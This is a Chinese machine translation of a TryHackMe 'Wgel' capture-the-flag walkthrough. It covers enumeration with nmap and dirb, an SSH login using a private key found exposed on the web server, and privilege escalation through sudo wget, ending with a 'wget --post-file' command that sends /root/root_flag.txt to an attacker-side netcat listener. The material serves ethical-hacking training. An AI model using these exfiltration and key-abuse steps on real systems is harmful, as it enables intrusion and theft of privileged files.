<html>
<head>
<title>WGEL CTF — TryHackMe Walkthrough</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">威格尔·CTF—TryHackMe演练</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/wgel-ctf-tryhackme-walkthrough-e1912f5ee62c?source=collection_archive---------1-----------------------#2022-01-27">https://infosecwriteups.com/wgel-ctf-tryhackme-walkthrough-e1912f5ee62c?source=collection_archive---------1-----------------------#2022-01-27</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><figure class="gl gn jr js jt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi jq"><img src="../Images/f7eeceeab62da8074647a24b452abf91.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*oPDRJ5Zos45byqxZmOcvuQ.png"/></div></div></figure><p id="63c1" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated"><em class="kz">免责声明:本文仅用于教育目的，未经被黑对象的事先同意，不要试图黑入任何人的设备，并且仅将这些信息用于道德目的。此外，不要侵入文章中显示的IP，因为你需要VPN访问来查看它们，并且它总是在变化。</em></p><p id="911b" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">学习道德黑客的最好方法是实践。但是真的很难找到愿意同意你黑他们的人<strong class="kd iu">。这就是Capture the Flag(CTF)公司发挥作用的地方，这些公司(如TryHackMe)允许你合法地在他们的机器上进行道德黑客行为。在这篇文章中，我将带你了解如何在TryHackMe上攻击<strong class="kd iu">威格</strong> CTF。</strong></p><h2 id="f665" class="la lb it bd lc ld le dn lf lg lh dp li km lj lk ll kq lm ln lo ku lp lq lr ls bi translated">扫描和计数</h2><p id="617a" class="pw-post-body-paragraph kb kc it kd b ke lt kg kh ki lu kk kl km lv ko kp kq lw ks kt ku lx kw kx ky im bi translated">我总是做的第一件事是用Nmap运行网络扫描，这样我就可以了解网络结构/架构，信息=能力。</p><pre class="ly lz ma mb gt mc md me mf aw mg bi"><span id="96a4" class="la lb it md b gy mh mi l mj mk">nmap -A -T4 -v [IP]</span></pre><ul class=""><li id="e6d9" class="ml mm it kd b ke kf ki kj km mn kq mo ku mp ky mq mr ms mt bi translated">A =获取设备信息</li><li id="b360" class="ml mm it kd b ke mu ki mv km mw kq mx ku my ky mq mr ms mt bi translated">T4 =跑得更快</li><li id="5232" class="ml mm it kd b ke mu ki mv km mw kq mx ku my ky mq mr ms mt bi translated">v =扫描时打印输出</li></ul><figure class="ly lz ma mb gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi mz"><img src="../Images/e53d566ff2c5c69920a612edbc0e9418.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*rrOBEuHXtHq-xPUXvbLITA.png"/></div></div><figcaption class="na nb gj gh gi nc nd bd b be z dk translated">Nmap结果</figcaption></figure><p id="983b" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">我看到运行Apache的端口80是打开的，所以我在web浏览器中打开了这个网站，查看发生了什么。我看到了一个默认网页(表明卫生/实践不佳)</p><figure class="ly lz ma mb gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi ne"><img src="../Images/af64f9cdbb20c19353e62f669285f497.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*pfOxdLwOfqhtvdXl"/></div></div><figcaption class="na nb gj gh gi nc nd bd b be z dk translated">默认Apache网页</figcaption></figure><p id="e8cd" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">我查看了页面源代码，看到了一个叫“jessie”的评论，这可能是一个用户名。</p><figure class="ly lz ma mb gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi nf"><img src="../Images/4a99c66c8a09103b09ae3515e7d2300b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*wDAYnAxt30ttbAOq2-pxxw.png"/></div></div><figcaption class="na nb gj gh gi nc nd bd b be z dk translated">默认网页的页面来源</figcaption></figure><p id="cdd1" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">我开始用<em class="kz"> dirb </em>枚举网页目录</p><pre class="ly lz ma mb gt mc md me mf aw mg bi"><span id="4452" class="la lb it md b gy mh mi l mj mk">dirb http://[ip]</span></pre><figure class="ly lz ma mb gt ju gh gi paragraph-image"><div class="gh gi ng"><img src="../Images/b621070a8895cc7673a4973db6833229.png" data-original-src="https://miro.medium.com/v2/resize:fit:956/0*TfzVbmuBvZ9W6KWw"/></div><figcaption class="na nb gj gh gi nc nd bd b be z dk translated">Dirb结果</figcaption></figure><p id="2eb4" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">它返回的结果是<em class="kz"> http://[ip]/sitemap </em>作为一个可能的目录，我导航到它并看到</p><figure class="ly lz ma mb gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi nh"><img src="../Images/f5187cac4dab304d79b72750d800cb25.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*FFfFYgr_Wmj05t7h"/></div></div><figcaption class="na nb gj gh gi nc nd bd b be z dk translated">网站目录“网站地图”</figcaption></figure><p id="2fc3" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">我开始在网站上手动枚举，但是似乎没有什么问题，所以我用<em class="kz"> dirb在网站目录上做了更多的枚举。</em></p><figure class="ly lz ma mb gt ju gh gi paragraph-image"><div class="gh gi ni"><img src="../Images/4f75e8cac797147c4b061ad6c402e2f8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1048/0*ezjVXETCux64w-fR"/></div><figcaption class="na nb gj gh gi nc nd bd b be z dk translated">枚举“站点地图”目录</figcaption></figure><p id="7399" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">看到了<em class="kz"> http://[ip]/sitemap/。ssh </em>，它看起来很有趣，所以我导航到目录并看到了它。</p><figure class="ly lz ma mb gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi nj"><img src="../Images/dd34de302b2ea8c870301199f72bb17e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Inn9xE_gr9phiWxavMgsSA.png"/></div></div><figcaption class="na nb gj gh gi nc nd bd b be z dk translated">在/sitemap/中。ssh目录</figcaption></figure><p id="9aa4" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">我点击id_rsa目录，它向我显示了一个私有ssh密钥。可用于登录ssh而无需密码。</p><figure class="ly lz ma mb gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi nk"><img src="../Images/036e37206909262b983b5d6345e754f1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*IlevfFoCVnY0QkwhBj1Ajg.png"/></div></div><figcaption class="na nb gj gh gi nc nd bd b be z dk translated">私有ssh密钥</figcaption></figure><p id="9147" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">我只是将它复制到一个文件中，并确保将其文件权限更改为<strong class="kd iu"> 600，</strong>，因为没有特定的权限它将无法工作。</p><pre class="ly lz ma mb gt mc md me mf aw mg bi"><span id="a6f6" class="la lb it md b gy mh mi l mj mk">nano id_rsa<br/>chmod 600 id_rsa</span></pre><h2 id="be43" class="la lb it bd lc ld le dn lf lg lh dp li km lj lk ll kq lm ln lo ku lp lq lr ls bi translated"><strong class="ak">利用</strong></h2><p id="f08f" class="pw-post-body-paragraph kb kc it kd b ke lt kg kh ki lu kk kl km lv ko kp kq lw ks kt ku lx kw kx ky im bi translated">现在我们可以通过ssh登录了</p><pre class="ly lz ma mb gt mc md me mf aw mg bi"><span id="4183" class="la lb it md b gy mh mi l mj mk">ssh -i id_rsa jessie@[ip] </span></pre><figure class="ly lz ma mb gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi nl"><img src="../Images/4b53da7a769a34399219f11b2d36ea48.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*D2Fy4i2vKWKCrvsB31CS1Q.png"/></div></div><figcaption class="na nb gj gh gi nc nd bd b be z dk translated">使用id _ rsa到机器中</figcaption></figure><p id="b9dc" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">耶，我们有低级别权限</p><h2 id="d469" class="la lb it bd lc ld le dn lf lg lh dp li km lj lk ll kq lm ln lo ku lp lq lr ls bi translated"><strong class="ak">特权升级</strong></h2><p id="136c" class="pw-post-body-paragraph kb kc it kd b ke lt kg kh ki lu kk kl km lv ko kp kq lw ks kt ku lx kw kx ky im bi translated">当我想提升我的权限时，我做的第一件事就是检查Sudo权限(例如:我可以作为root运行什么)</p><pre class="ly lz ma mb gt mc md me mf aw mg bi"><span id="1043" class="la lb it md b gy mh mi l mj mk">sudo -l</span></pre><figure class="ly lz ma mb gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi nm"><img src="../Images/5e90a8599e2535fe4002aea4e9fced3b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*69ylongRArJrkiqLgq2Mcg.png"/></div></div><figcaption class="na nb gj gh gi nc nd bd b be z dk translated">检查sudo权限</figcaption></figure><p id="6703" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">我们可以看到，我们可以以root用户身份运行wget，现在我们可以转到<a class="ae nn" href="https://gtfobins.github.io/" rel="noopener ugc nofollow" target="_blank"> GTFObins </a>来寻找升级技术。</p><figure class="ly lz ma mb gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi no"><img src="../Images/88000d3e359ecfd21b5d7edbeaf48377.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*S9c8D__rGLBfYZMx"/></div></div><figcaption class="na nb gj gh gi nc nd bd b be z dk translated">GTFObins wget sudo升级技术</figcaption></figure><p id="4972" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">从高层次上看，这些命令基本上是获取某个文件，并将其发送到道德黑客的桌面。我们可以通过在自己的机器上打开一个端口来复制这种技术</p><pre class="ly lz ma mb gt mc md me mf aw mg bi"><span id="68b2" class="la lb it md b gy mh mi l mj mk">nc -nvlp 9999</span></pre><p id="323d" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">然后向该机器发送根标志</p><pre class="ly lz ma mb gt mc md me mf aw mg bi"><span id="4fe3" class="la lb it md b gy mh mi l mj mk">sudo wget --post-file=/root/root_flag.txt <a class="ae nn" href="http://[my_ip]:9999" rel="noopener ugc nofollow" target="_blank">http://[my_ip]:9999</a></span></pre><p id="3456" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">现在，如果我们回顾netcat，我们可以看到一串字符(这是根标志)。</p><figure class="ly lz ma mb gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi np"><img src="../Images/facba6a0bf35d972ee3e63aea813a73c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Ksu_Sq-t2aWc0m87iG_4Zg.png"/></div></div><figcaption class="na nb gj gh gi nc nd bd b be z dk translated">Netcat接收根标志</figcaption></figure><p id="8dfd" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">恭喜你，你已经根了机器。感谢您阅读这个CTF演练，并记住<strong class="kd iu">只有</strong>将此信息用于<strong class="kd iu">道德目的。</strong></p></div><div class="ab cl nq nr hx ns" role="separator"><span class="nt bw bk nu nv nw"/><span class="nt bw bk nu nv nw"/><span class="nt bw bk nu nv"/></div><div class="im in io ip iq"><h1 id="1bfd" class="nx lb it bd lc ny nz oa lf ob oc od li oe of og ll oh oi oj lo ok ol om lr on bi translated">🔈 🔈Infosec Writeups正在组织其首次虚拟会议和网络活动。如果你对信息安全感兴趣，这是最酷的地方，有16个令人难以置信的演讲者和10多个小时充满力量的讨论会议。<a class="ae nn" href="https://iwcon.live/" rel="noopener ugc nofollow" target="_blank">查看更多详情并在此注册。</a></h1><div class="oo op gp gr oq or"><a href="https://iwcon.live/" rel="noopener  ugc nofollow" target="_blank"><div class="os ab fo"><div class="ot ab ou cl cj ov"><h2 class="bd iu gy z fp ow fr fs ox fu fw is bi translated">IWCon2022 - Infosec书面报告虚拟会议</h2><div class="oy l"><h3 class="bd b gy z fp ow fr fs ox fu fw dk translated">与世界上最优秀的信息安全专家建立联系。了解网络安全专家如何取得成功。将新技能添加到您的…</h3></div><div class="oz l"><p class="bd b dl z fp ow fr fs ox fu fw dk translated">iwcon.live</p></div></div><div class="pa l"><div class="pb l pc pd pe pa pf jz or"/></div></div></a></div></div></div>    
</body>
</html>